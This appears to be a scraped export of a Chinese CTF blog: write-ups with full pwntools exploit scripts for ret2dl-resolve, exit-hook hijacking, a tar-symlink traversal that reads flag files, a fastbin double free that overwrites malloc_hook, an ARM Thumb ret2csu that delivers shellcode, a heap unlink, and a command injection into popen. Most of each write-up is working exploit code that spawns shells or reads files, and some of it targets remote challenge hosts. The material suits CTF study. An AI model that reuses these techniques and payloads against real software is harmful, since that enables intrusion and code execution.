#第二次，我们需要发送rop以及伪造的数据结构  rop = &#x27;\\x00&#x27;*0x4 + p32(plt0) + p32(fake_rel_addr - rel_addr)  rop += p32(0) + p32(binsh_str)  payload2 = rop.ljust(0x900-0x800,&#x27;\\x00&#x27;) + (&#x27;system\\x00/bin/sh\\x00&#x27;.ljust(0x10,&#x27;\\x00&#x27;))  payload2 += fake_dynsym + fake_rel  sh.sendline(payload2)    sh.interactive()  \n\n然后我们看看64位的情况下\n//编译  //gcc ret2dl-solv.c -z lazy -no-pie -fno-stack-protector -o ret2dlsolve_64 \n\n\n#coding:utf8  #64位情况下，伪造rel.plt变得不可行，因为在  &#x27;&#x27;&#x27;&#x27;&#x27;if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)   &#123;     const ElfW(Half) *vernum =(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);     ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;     version = &amp;l-&gt;l_versions[ndx];     if (version-&gt;hash == 0)       version = NULL;   &#125; &#x27;&#x27;&#x27;  #这里，出现了访问未映射的内存  #主要是reloc-&gt;r_info过大的原因，因为我们在bss段伪造的数据，而bss段一般位于0x600000  #然后真正的rel.plt位于0x400000内，导致过大。  #如果我们在里0x400000处有可读写的区域，或许就可以成功  #本脚本在最后一步调用dl_runtime_resolve解析符号失败，因为上述原因  from pwn import *    sh = process(&#x27;./ret2dlsolve_64&#x27;)  elf = ELF(&#x27;./ret2dlsolve_64&#x27;)  read_plt = elf.plt[&#x27;read&#x27;]  read_got = elf.got[&#x27;read&#x27;]  pop_rbp = 0x400468  pop_rdi = 0x400583  #pop rsi ; pop r15 ; ret  pop_rsi = 0x400581  leave_ret = 0x400506  #用于解析符号dl_runtime_resolve  plt_load = 0x4003E0  #bss段  bss = 0x601030    #第一次，我们做栈迁移，同时继续调用read输入数据  payload = &#x27;a&#x27;*0x28 + p64(pop_rbp) + p64(bss + 0x580) + p64(pop_rsi) + p64(bss + 0x580) + p64(0) + p64(pop_rdi) + p64(0) + p64(read_plt) + p64(leave_ret)  raw_input()  sh.sendline(payload)  #真正的dynstr的地址  dynstr = 0x400318  #真正的dynsym的地址  dynsym = 0x4002B8  #真正的rel.plt的地址  rel_plt = 0x4003B0  #system字符串存储的字符串的地址  system_str_addr = bss + 0x600  #/bin/sh字符串存的地址  binsh_addr = system_str_addr + len(&#x27;system&#x27;) + 1  #伪造的dynsym地址  fake_dynsym_addr = bss + 0x618  #伪造的dynsym  fake_dynsym = (p32(system_str_addr - dynstr) + p8(0x12)).ljust(0x18,&#x27;\\x00&#x27;)  #伪造的rel地址,0x8是align作用  fake_rel_addr = fake_dynsym_addr + len(fake_dynsym) + 0x8  #伪造rel.plt  fake_rel = p64(read_got) + p64((((fake_dynsym_addr - dynsym) / 0x18) &lt;&lt; 32) + 0x7) + p64(0)    rop = &#x27;\\x00&#x27;*8 + p64(pop_rdi) + p64(binsh_addr) + p64(plt_load) + p64( (fake_rel_addr - rel_plt) / 0x18)  payload2 = rop.ljust(0x80,&#x27;\\x00&#x27;) + (&#x27;system\\x00/bin/sh\\x00&#x27;).ljust(0x18,&#x27;\\x00&#x27;)  payload2 += fake_dynsym + &#x27;\\x00&#x27;*0x8 + fake_rel  raw_input()  sh.sendline(payload2)    sh.interactive()  \n\n理论上和32位差不多，但是出现了访问错误，因为在中间的执行过程中，[访问到了一段未映射的地址处。]{.mark}\n因此，我们得另外想办法，那么得回过来看源代码\nif (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)  &#123;  ....  &#125;  \n\n第一种方法是修改link_map，使得条件不成了。这种方法需要知道link_map的地址，也就是需要泄露link_map的地址。但是这显得很鸡肋，既然能够泄露，干嘛要用ret2-dl-resolve呢？\n另一种方法是绕过最外层的if\nif (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123;          ...  &#125; else &#123;          /* We already found the symbol.  The module (and therefore its load         address) is also known.  */          value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);          result = l;  &#125;\n\n我们到最外层的else里去，如果，我们伪造link_map，让sym-&gt;st_value为某个已经解析了的函数的[地址]{.mark},比如read，让l-&gt;l_addr为我们需要的函数(system)到read的偏移,这样,l-&gt;l_addr + sym-&gt;st_value就是我们需要的函数地址。\ntypedef struct  &#123;    Elf64_Word    st_name;        /* Symbol name (string tbl index) */    unsigned char st_info;        /* Symbol type and binding */    unsigned char st_other;       /* Symbol visibility */    Elf64_Section st_shndx;       /* Section index */    Elf64_Addr    st_value;       /* Symbol value */    Elf64_Xword   st_size;        /* Symbol size */  &#125; Elf64_Sym;  \n\n如何让sym-&gt;st_value为已经解析的函数的地址？\n\n\n[如果，我们把read_got – 0x8处开始当成sym，那么sym-&gt;st_value就是read的地址，并且sym-&gt;st_other正好也不为0，绕过了if，一举两得]{.mark}\n为了伪造link_map，我们需要知道link_map的结构，在glibc&#x2F;include&#x2F;link.h文件里，link_map结构比较复杂，但是，我们只需伪造需要用到的数据即可。\n\n\n我们需要伪造这个数组里的几个指针，它们分别是\nDT_STRTAB指针：位于link_map_addr +0x68(32位下是0x34)\nDT_SYMTAB指针：位于link_map_addr + 0x70(32位下是0x38)\nDT_JMPREL指针：位于link_map_addr +0xF8(32位下是0x7C)\n然后伪造三个elf64_dyn即可，dynstr只需要指向一个可读的地方，因为这里我们没有用到\ntypedef struct  &#123;    Elf64_Sxword  d_tag;          /* Dynamic entry type */    union      &#123;        Elf64_Xword d_val;        /* Integer value */        Elf64_Addr d_ptr;         /* Address value */      &#125; d_un;  &#125; Elf64_Dyn;  \n\n现在，我们就开始伪造\n#l_addr  fake_link_map = p64(l_addr)  #由于link_map的中间部分在我们的攻击中无关紧要，所以我们把伪造的几个数据结构也放当中  fake_link_map += fake_dyn_strtab  fake_link_map += fake_dyn_symtab  fake_link_map += fake_dyn_rel  fake_link_map += fake_rel  fake_link_map = fake_link_map.ljust(0x68,&#x27;\\x00&#x27;)  #dyn_strtab的指针  fake_link_map += p64(fake_dyn_strtab_addr)  #dyn_strsym的指针  fake_link_map += p64(fake_dyn_symtab_addr) #fake_link_map_addr + 0x70  #存入/bin/sh字符串  fake_link_map += &#x27;/bin/sh&#x27;.ljust(0x80,&#x27;\\x00&#x27;)  #在fake_link_map_addr + 0xF8处，是rel.plt指针  fake_link_map += p64(fake_dyn_rel_addr)  \n\n综上，我们的exp脚本\n#coding:utf8  from pwn import *    sh = process(&#x27;./ret2dlsolve_64&#x27;)  elf = ELF(&#x27;./ret2dlsolve_64&#x27;)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)  read_plt = elf.plt[&#x27;read&#x27;]  read_got = elf.got[&#x27;read&#x27;]  fun_addr = elf.sym[&#x27;fun&#x27;]    #bss段  bss = 0x601030    l_addr = libc.sym[&#x27;system&#x27;] - libc.sym[&#x27;read&#x27;]  #注意，只要是可读写的内存地址即可，调试看看就知道了  r_offset = bss + l_addr * -1    #负数需要补码  if l_addr &lt; 0:     l_addr = l_addr + 0x10000000000000000    pop_rdi = 0x400583  #pop rsi ; pop r15 ; ret  pop_rsi = 0x400581  #用于解析符号dl_runtime_resolve  plt_load = 0x4003E6    #第一次继续调用read输入伪造的数据结构，然后再一次调用fun来输入rop  payload = &#x27;a&#x27;*0x28 + p64(pop_rsi) + p64(bss + 0x100) + p64(0) + p64(pop_rdi) + p64(0) + p64(read_plt) + p64(fun_addr)  #raw_input()  sleep(1)  sh.sendline(payload)  #真正的dynstr的地址  dynstr = 0x400318  #我们准备把link_map放置在bss+0x100处  fake_link_map_addr = bss + 0x100  #假的dyn_strtab  fake_dyn_strtab_addr = fake_link_map_addr + 0x8  fake_dyn_strtab = p64(0) + p64(dynstr) #fake_link_map_addr + 0x8  #假的dyn_symtab，我们要让对应的dynsym里的st_value指向一个已经解析过的函数的got表  #其他字段无关紧要，所以，我们让dynsym为read_got - 0x8，这样，相当于把read_got - 0x8处开始当做一个dynsym，这样st_value正好对应了read的地址  #并且(*(sym+5))&amp;0x03 != 0也成立  fake_dyn_symtab_addr = fake_link_map_addr + 0x18  fake_dyn_symtab = p64(0) + p64(read_got - 0x8) #fake_link_map_addr + 0x18  #假的dyn_rel  fake_dyn_rel_addr = fake_link_map_addr + 0x28  fake_dyn_rel = p64(0) + p64(fake_link_map_addr + 0x38) #fake_link_map_addr + 0x28  #假的rel.plt  fake_rel = p64(r_offset) + p64(0x7) + p64(0) #fake_link_map_addr + 0x38  #l_addr  fake_link_map = p64(l_addr)  #由于link_map的中间部分在我们的攻击中无关紧要，所以我们把伪造的几个数据结构也放当中  fake_link_map += fake_dyn_strtab  fake_link_map += fake_dyn_symtab  fake_link_map += fake_dyn_rel  fake_link_map += fake_rel  fake_link_map = fake_link_map.ljust(0x68,&#x27;\\x00&#x27;)  #dyn_strtab的指针  fake_link_map += p64(fake_dyn_strtab_addr)  #dyn_strsym的指针  fake_link_map += p64(fake_dyn_symtab_addr) #fake_link_map_addr + 0x70  #存入/bin/sh字符串  fake_link_map += &#x27;/bin/sh&#x27;.ljust(0x80,&#x27;\\x00&#x27;)  #在fake_link_map_addr + 0xF8处，是rel.plt指针  fake_link_map += p64(fake_dyn_rel_addr)    sleep(1)  sh.sendline(fake_link_map)  sleep(1)  #raw_input()  #现在，我们伪造好了link_map，那么，我们就可以来解析system了  rop = &#x27;A&#x27;*0x28 + p64(pop_rdi) + p64(fake_link_map_addr + 0x78)  + p64(plt_load) + p64(fake_link_map_addr) + p64(0)  sh.sendline(rop)    sh.interactive()  \n\nFULL_RELRO的情况下程序在运行之前就已经调用了ld.so将所需的外部函数加载完成，程序运行期间不再动态加载，因此，在程序的got表中，link_map和dl_runtime_resolve函数的地址都为0，因为后续不再使用，没有必要。\n\n\n因此**[在FULL_RELRO的情况下，要想利用ret2dl-runtime-resolve技术，就只能在栈中低位覆盖数据一定几率恢复出dl_runtime_resolve。]{.mark}**\n比如在glibc2.27下，我们低位覆盖这个数据，有很大几率指向dl_runtime_resolve函数的地址，然后，link_map我们可以在我们可控的地方伪造。\n\n\n然而，仍然很难利用起来，由于低位覆盖的原因，我们不能继续再在这个位置后面布置其他ROP。因此，在不是特别没办法时，尽量考虑其他方法。\n这里，介绍一种其他的方法来针对FULL_RELRO的方案来getshell，那就是低位覆盖栈中数据一定几率指向syscall，构造execve(“&#x2F;bin&#x2F;sh”,0,0)系统调用。要构造这样的ROP，其他gadget容易搞定，关键是edx必须为0，不然调用会出错，然而，pop edx或pop rdx这样的gadget基本没有，因此，我们可以ret2csu，来控制edx\n\n","categories":["CTF"],"tags":["ROP","ret2dl"]},{"title":"roarctf2020_2a1","url":"/2020/12/06/roarctf2020-2a1/","content":"程序的功能是可以泄露任意地址的数据，然后可以往任意地址处写一个堆地址\n\n由于写完后，没有调用相关的IO输入输出函数，因此劫持IO流没用，于是想到劫持exit，在exit断点，在exit开始处有一个指针，其内部是某些结构\n\n\n继续向下，可以发现，exit会从中取出一个加密的数据解密后作为函数地址进行调用\n\n\n因此，我们可以伪造这个结构，在适当位置布置好指针，这个指针需要加密，因此我们用一次地址泄露泄露出fs:30的值。\n#coding:utf8from pwn import *def rol(val,n):   return ((val &lt;&lt; n) &amp; 0xFFFFFFFFFFFFFFFF) | ((val &gt;&gt; (64 - n)) &amp; 0xFFFFFFFFFFFFFFFF)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)#sh = remote(&#x27;47.104.178.87&#x27;,34377)sh = process(&#x27;./2+1&#x27;)sh.recvuntil(&#x27;Gift: &#x27;)alarm_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)libc_base = alarm_addr - libc.sym[&#x27;alarm&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()print &#x27;libc_base=&#x27;,hex(libc_base)#泄露fs:30的cookiesh.sendafter(&#x27;where to read?:&#x27;,p64(libc_base + 0x5efc70))sh.recvuntil(&#x27;data: &#x27;)cookie = u64(sh.recv(8))print &#x27;cookie=&#x27;,hex(cookie)rop_addr = cookie - 0xF0print(hex(libc_base+0x39f40))#raw_input()sh.sendafter(&#x27;where to write?:&#x27;,p64(libc_base + 0x3c45f8))sh.sendafter(&#x27;msg:&#x27;,&#x27;a&#x27;*0x8 + p64(0x5) + p64(0x4) + p64(rol(system_addr ^ cookie,0x11)) + p64(binsh_addr))sh.interactive()","categories":["CTF"],"tags":["exit_hook"]},{"title":"roarctf2020_qtar","url":"/2020/12/06/roarctf2020-qtar/","content":"通过盲打测试，可以发现在compress的rename时，可以覆盖掉已经存在的文件，这样，我们就可以使得我们自己上传的文件被打上标记，从而能够对我们上传的压缩包进行解压，通过提示功能知道flag在&#x2F;home&#x2F;ctf&#x2F;flag，于是考虑在本地制造一个软链接文件，然后压缩成tar，这样在远程解压时链接上。然后我们就可以读取文件内容了，发现&#x2F;home路径被ban了。于是先读取&#x2F;proc&#x2F;self&#x2F;status，得到父进程的pid，这样，我们就可以通过&#x2F;proc&#x2F;{ppid}&#x2F;cwd去访问&#x2F;home&#x2F;ctf目录\n#coding:utf8from pwn import *import ossh = remote(&#x27;47.104.178.87&#x27;,35360)def upload(content):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;u&#x27;)   sh.sendlineafter(&#x27;Content:&#x27;,content)   sh.recvuntil(&#x27;File uploaded as /tmp/&#x27;)   return sh.recvuntil(&#x27;\\n&#x27;,drop = True)def compress(name,rename=&#x27;&#x27;):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;c&#x27;)   sh.sendlineafter(&#x27;Filename: /tmp/&#x27;,name)   if rename == &#x27;&#x27;:      sh.sendlineafter(&#x27;Rename archive file? [y/N]&#x27;,&#x27;N&#x27;)   else:      sh.sendlineafter(&#x27;Rename archive file? [y/N]&#x27;,&#x27;y&#x27;)      print &#x27;rename&#x27;,rename      sh.sendlineafter(&#x27;Arcname:&#x27;,rename)   sh.recvuntil(&#x27;File compressed as &#x27;)   return sh.recvuntil(&#x27;\\n&#x27;,drop = True)def extract(name):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;x&#x27;)   sh.sendlineafter(&#x27;Filename:&#x27;,name)def readf(name):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;r&#x27;)   sh.sendlineafter(&#x27;Filename:&#x27;,name)def watch(file):   os.system(&#x27;rm -r ff&#x27;)   os.system(&#x27;ln -s &#123;&#125; ff&#x27;.format(file))   os.system(&#x27;tar -cvpf ff.tar ff&#x27;)   f = open(&#x27;ff.tar&#x27;,&#x27;rb&#x27;)   content = f.read()   f.close()   a = upload(content)   b = upload(&#x27;haivk&#x27;)   b_c = compress(b)   a_c = compress(a,b_c)   extract(a_c)   #解压我们自己上传的tar文件   extract(b_c)   #改变权限   compress(a,&#x27;ff&#x27;)   readf(&#x27;ff&#x27;)#context.log_level = &#x27;debug&#x27;watch(&#x27;/proc/self/status&#x27;)sh.recvuntil(&#x27;PPid:&#x27;)ppid = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True))print ppidwatch(&#x27;/proc/&#123;&#125;/cwd/flag&#x27;.format(ppid))sh.interactive()","categories":["CTF"],"tags":["目录穿越"]},{"title":"roarctf_2019_easyheap(文件描述符1关闭后仍然可以交互)","url":"/2020/04/17/roarctf_2019_easyheap/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n最开始的时候，我们可以在bss段输入一些数据，这意味着，我们可以在bss段伪造一个chunk\n\n\nshow功能必须要满足条件才能使用\n\n\nFree后没有清空指针，因此存在double free。\n\n\n666功能也可以创建和free堆，但是有次数限制，但是这个次数限制也存在漏洞，即qword_602010为0时，仍然会减去1，使得其值变成负数，下一次就可以无限制的使用这个功能了。\n\n\nGlibc版本为2.23，我们可以先double free fastbin chunk，然后fastbin attack分配到bss段伪造的chunk，篡改show的标记，篡改buf指针为got表，这样，我们就能调用show泄露出地址了。\n[Fastbin的double free需要有一个中间chunk，这个中间chunk，我们可以从calloc分配出来的0xB0的chunk里切割]{.mark}，切割以后，ptr指向的就是一个0x70的chunk，由于ptr指针之前没有清空，因此就能利用UAF来释放这个中间chunk，从而实现fastbin的double free。\nadd(0x60,&#x27;b&#x27;*0x60)calloc_del()add(0x60,&#x27;a&#x27;*0x60)add(0x60,&#x27;a&#x27;*0x60)#double freedelete()calloc_del()delete()add(0x60,p64(fake_chunk_addr))add(0x60,&#x27;a&#x27;*0x60)add(0x60,&#x27;b&#x27;*0x60)add(0x60,&#x27;c&#x27;*0x18 + p64(read_got) + p64(0xDEADBEEFDEADBEEF))show()sh.recv(1)read_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))libc_base = read_addr - libc.sym[&#x27;read&#x27;]realloc_addr = libc_base + realloc_smalloc_hook_addr = libc_base + malloc_hook_sone_gadget_addr = libc_base + one_gadget_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)\n\n调用show后，问题来了，文件描述1符将被关闭，这意味着不再有正常的输出。\n\n\nExp里都显示GOT EOF了，但是**[程序其实没有结束，还在运行，并且任意可以输入数据。]{.mark}**\n\n\n因此，我们该怎么样就继续怎么样操作即可。再次利用double free，然后分配到malloc_hook，写one_gadget即可，需要用realloc来调整栈。\n#coding:utf8from pwn import *sh = process(&#x27;./roarctf_2019_easyheap&#x27;)#sh = remote(&#x27;node3.buuoj.cn&#x27;,25252)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]realloc_s = libc.sym[&#x27;realloc&#x27;]one_gadget_s = 0xf1147elf = ELF(&#x27;./roarctf_2019_easyheap&#x27;)read_got = elf.got[&#x27;read&#x27;]fake_chunk_addr = 0x0000000000602060fake_chunk = p64(0) + p64(0x71)fake_chunk = fake_chunk.ljust(0x20,&#x27;\\x00&#x27;)sh.sendafter(&#x27;please input your username:&#x27;,fake_chunk)sh.sendafter(&#x27;please input your info:&#x27;,&#x27;haivk\\n&#x27;)def add(size,content,blind = False):   if not blind:      sh.recvuntil(&#x27;&gt;&gt;&#x27;)   else:      sleep(0.3)   sh.sendline(&#x27;1&#x27;)   if not blind:      sh.recvuntil(&#x27;input the size&#x27;)   else:      sleep(0.3)   sh.sendline(str(size))   if not blind:      sh.recvuntil(&#x27;please input your content&#x27;)   else:      sleep(0.3)   sh.send(content)def delete(blind = False):   if not blind:      sh.recvuntil(&#x27;&gt;&gt;&#x27;)   else:      sleep(0.3)   sh.sendline(&#x27;2&#x27;)def show():   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)def calloc_A0(content,blind = False):   if not blind:      sh.recvuntil(&#x27;&gt;&gt;&#x27;)   else:      sleep(0.3)   sh.sendline(&#x27;666&#x27;)   if not blind:      sh.recvuntil(&#x27;build or free?&#x27;)   else:      sleep(0.3)   sh.sendline(&#x27;1&#x27;)   if not blind:      sh.recvuntil(&#x27;please input your content&#x27;)   else:      sleep(0.3)   sh.send(content)def calloc_del(blind = False):   if not blind:      sh.recvuntil(&#x27;&gt;&gt;&#x27;)   else:      sleep(0.3)   sh.sendline(&#x27;666&#x27;)   if not blind:      sh.recvuntil(&#x27;build or free?&#x27;)   else:      sleep(0.3)   sh.sendline(&#x27;2&#x27;)calloc_A0(&#x27;a&#x27;*0xA0)add(0x60,&#x27;b&#x27;*0x60)calloc_del()add(0x60,&#x27;a&#x27;*0x60)add(0x60,&#x27;a&#x27;*0x60)#double freedelete()calloc_del()delete()add(0x60,p64(fake_chunk_addr))add(0x60,&#x27;a&#x27;*0x60)add(0x60,&#x27;b&#x27;*0x60)add(0x60,&#x27;c&#x27;*0x18 + p64(read_got) + p64(0xDEADBEEFDEADBEEF))show()sh.recv(1)read_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))libc_base = read_addr - libc.sym[&#x27;read&#x27;]realloc_addr = libc_base + realloc_smalloc_hook_addr = libc_base + malloc_hook_sone_gadget_addr = libc_base + one_gadget_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)#第一次调用为0时，不会执行，减1后变成负数calloc_A0(&#x27;a&#x27;,True)#利用同样的方法来double freecalloc_A0(&#x27;a&#x27;*0xA0,True)add(0x60,&#x27;b&#x27;*0x60,True)calloc_del(True)add(0x60,&#x27;a&#x27;*0x60,True)add(0x60,&#x27;a&#x27;*0x60,True)#double freedelete(True)calloc_del(True)delete(True)add(0x60,p64(malloc_hook_addr - 0x23),True)add(0x60,&#x27;a&#x27;*0x60,True)add(0x60,&#x27;b&#x27;*0x60,True)add(0x60,&#x27;\\x00&#x27;*0xB + p64(one_gadget_addr) + p64(realloc_addr + 0x14),True)#getshellsh.sendline(&#x27;1&#x27;)sleep(0.3)sh.sendline(&#x27;1&#x27;)sh.interactive()\n\n\n\n在getshell后，shell里需要重定向文件描述符来获得输出。由此可见，GOT EOF时，程序不一定是结束了。\n","categories":["CTF"],"tags":["UAF","fastbin","文件描述符1关闭"]},{"title":"(ARM PWN里的thumb模式和arm模式的切换)root_me_stack_buffer_overflow_basic","url":"/2020/07/24/root_me_stack_buffer_overflow_basic/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，栈溢出漏洞\n\n\n在CSU里面有可以利用的gadget，但是直接ret过去，会报invalid instrument错误。\n\n\n这是由于在csu这里的指令是thumb指令，需要将cpu工作状态转移到thumb指令状态才可以执行。标记ARM状态是用CPSR寄存器中的标志位T，\n\n\nBX指令可以设置T位，当BX后面的地址值最后一个bit为1时，则将T置位，cpu工作在thumb模式，如果bit为0，则为arm模式。同理，直接ret也具有这个特性，因此，只需要在确保目的地址值的最后一个bit为1，既可以切换到thumb模式，来执行csu的gadget。\n#coding:utf8from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;arm&#x27;)elf = ELF(&#x27;./root_me_stack_buffer_overflow_basic&#x27;)scanf_got = elf.got[&#x27;scanf&#x27;]bss = 0x00021008 + 0x100csu_pop = 0x00010610csu_call = 0x000105FE#sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/arm_pwn/arm-libs&#x27;,&#x27;./root_me_stack_buffer_overflow_basic&#x27;])#sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/arm_pwn/arm-libs&#x27;,&#x27;./root_me_stack_buffer_overflow_basic&#x27;])sh = remote(&#x27;node3.buuoj.cn&#x27;,29902)payload = &#x27;a&#x27;*0xA4 + p32(csu_pop + 1) #切换到Thumb模式，bit0 = 1payload += p32(0) #R5payload += p32(0) #R4payload += p32(scanf_got) #R5payload += p32(1) #R6payload += p32(0x00010644) #R7payload += p32(bss) #R8payload += p32(0) #R9payload += p32(csu_call + 1) #Thumb模式，bit0 = 1payload += p32(0)*0x7payload += p32(bss) #执行shellcodesh.sendlineafter(&#x27;dump:&#x27;,payload)sh.sendlineafter(&#x27;Dump again (y/n):&#x27;,&#x27;n&#x27;)sh.sendline(asm(shellcraft.sh()))sh.interactive()","categories":["CTF"],"tags":["栈溢出","ret2csu","arm"]},{"title":"secretHolder_hitcon_2016(超大chunk如何从top chunk里分配而不是mmap)","url":"/2020/04/30/secretHolder_hitcon_2016/","content":"这题和上一题https://blog.csdn.net/seaaseesa/article/details/105856878功能相似，并且上一题的利用手法这里同样可以利用，这里，有另一种手法，从而引出了一个新的知识点。\n\n\n这题，delete功能里增加了对huge chunk的free\n\n\nHuge chunk的大小为0x61A80，这会使用mmap来分配。\n\n\n我们先来看一下glibc的源码，当top chunk的size满足不了申请的大小后，就会调用sysmalloc来分配chunk给用户。\n\n\n当top chunk为空，或者请求的size大于等于mmap的阈值，会使用mmap来映射内存给用户。\n\n\n并且映射的大小是页对齐的\n\n\n否则，扩展top chunk，然后从top chunk里分配内存\n\n\n因此，我们只要从第一个if判断阈值那里逃逸过去，这样就可以从top chunk里分配。\n我们看看这个阈值\n\n\n\n\n程序中的huge chunk大小为0x61A80，大于最小阈值，因此第一次malloc(0x61A80)，使用mmap分配内存。当free这个chunk的时候，我们看到free的源码,对阈值做了调整，将阈值设置为了chunksize，由于之前申请chunk时，size做了页对齐，所以，此时chunksize(p)为0x62000,，也就是阈值将修改为0x62000。\n\n\n下一次，我们重新malloc的时候，只要nb大小小于0x62000这个阈值，就会从top chunk分配。因此，当我们再次malloc(0x61A80)的时候，nb &#x3D; 0x61A90，小于阈值，就绕过了if，执行后面的代码从top chunk分配。\n我们可以做个实验\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;char *ptr;int main() &#123;   setbuf(stdout,0);   setbuf(stdin,0);   setbuf(stderr,0);   ptr = malloc(0x61A800);   printf(&quot;huge chunk ptr=0x%lx\\n&quot;,ptr);   printf(&quot;free huge chunk\\n&quot;);   free(ptr);   printf(&quot;malloc huge chunk\\n&quot;);   ptr = malloc(0x61A800);   printf(&quot;huge chunk ptr=0x%lx\\n&quot;,ptr);   getchar();&#125;\n\n我们看到第二次申请回来的时候，地址变成了普通堆的地址。\n\n\n那么，我们回到题目，我们可以先构造堆布局\n\n\n\n由于bss上保留了堆指针没有清空，接下来，我们malloc huge chunk，首先会发生malloc_consolidate，将fastbin也合并到top chunk，接下来调用sysmalloc,扩展top chunk，然后从top chunk里分配。最终，返回的chunk地址与0x30的fastbin的地址是同一个。那么，通过这个huge chunk，在对应指针指向的位置伪造几个chunk，最后通过delete unsorted bin那个chunk对应的指针，达到unlink。实现了unlink后，就可以实现任意地址读写。\n#coding:utf8from pwn import *#context.log_level = &#x27;debug&#x27;#sh = process(&#x27;./secretHolder_hitcon_2016&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25895)elf = ELF(&#x27;./secretHolder_hitcon_2016&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)atoi_got = elf.got[&#x27;atoi&#x27;]free_got = elf.got[&#x27;free&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]def add(type,content):   sh.sendlineafter(&#x27;3. Renew secret&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;3. Huge secret&#x27;,str(type))   sh.sendafter(&#x27;Tell me your secret:&#x27;,content)def delete(type):   sh.sendlineafter(&#x27;3. Renew secret&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;3. Huge secret&#x27;,str(type))def edit(type,content):   sh.sendlineafter(&#x27;3. Renew secret&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;3. Huge secret&#x27;,str(type))   sh.sendafter(&#x27;Tell me your secret:&#x27;,content)huge_ptr_addr = 0x00000000006020A8add(1,&#x27;a&#x27;*0x20) #smalladd(2,&#x27;b&#x27;*0x20) #bigdelete(1)delete(2)#使用了mmap分配大chunkadd(3,&#x27;c&#x27;*0x20)#释放后，阈值被调整，下一次将从top chunk里分配delete(3)#chunk1fake_chunk = p64(0) + p64(0x21)#fd、bkfake_chunk += p64(huge_ptr_addr - 0x18) + p64(huge_ptr_addr - 0x10)fake_chunk += p64(0x20) + p64(0x100)fake_chunk += &#x27;b&#x27;*0xF0fake_chunk += (p64(0) + p64(0x21) + &#x27;d&#x27;*0x10) * 2add(3,fake_chunk)#unlinkdelete(2)#控制堆数组edit(3,&#x27;\\x00&#x27;*0x10 + p64(atoi_got) + p64(atoi_got) + p64(free_got) + p64(1)*3)#修改free的got表为puts的pltedit(1,p64(puts_plt))#泄露atoi的got表delete(3)sh.recvuntil(&#x27;\\n&#x27;)atoi_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))libc_base = atoi_addr - libc.sym[&#x27;atoi&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)#修改atoi的got表为system地址edit(2,p64(system_addr))#getshellsh.sendlineafter(&#x27;3. Renew secret&#x27;,&#x27;sh\\x00&#x27;)sh.interactive()","categories":["CTF"],"tags":["unlink","unsorted bin","top chunk","mmap阀值随free调整"]},{"title":"secret_file","url":"/2019/11/10/secret_file/","content":"首先，我们看一下程序的保护机制\n\n\n吓了一跳，几个关键保护全开。\n然后，我们用IDA分析一下\n\n\n好像很复杂的样子。以往的ROP这些都用不了。然而，只要这个条件成立，就可以执行popen了。\n其中，我们发现v15是一个定值，在这里面被初始化,调试后发现是一个字符串9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127，是一个hash值\n\n\n程序的流程是这样的\n\n\n让我们看看v15、v17和dest直接的位置关系\n\n\nv14是popen的command字符串，v15是预先的hash字符串,v17是计算出来的hash。我们可以溢出dest，覆盖v14位置为我们需要的shell命令，覆盖v15为前100个字符的hash值，因为那个hash函数，限制了最多100个字符，而前面100个字符是我们自己构造的，我们可以单独计算出它的hash值，再覆盖给v15。[这样,strcmp比较两个字符串相等，返回0]{.mark}\n**[在我们的payload中，前100个字符是a，因此我们需要先算出’a’100的hash值。]{.mark}*\n我们发现，dest向后100个字节处正好是command的开始\n因此，我们的payload如下\n需要注意的是，命令末尾的分号(;)不能省略，具体看shell的规则,用分号隔开。\npadding = &#x27;a&#x27;*0x100    payload = padding + &#x27;cat flag.txt;&#x27;.ljust(0x1B,&#x27; &#x27;) + hashlib.sha256(padding).hexdigest()  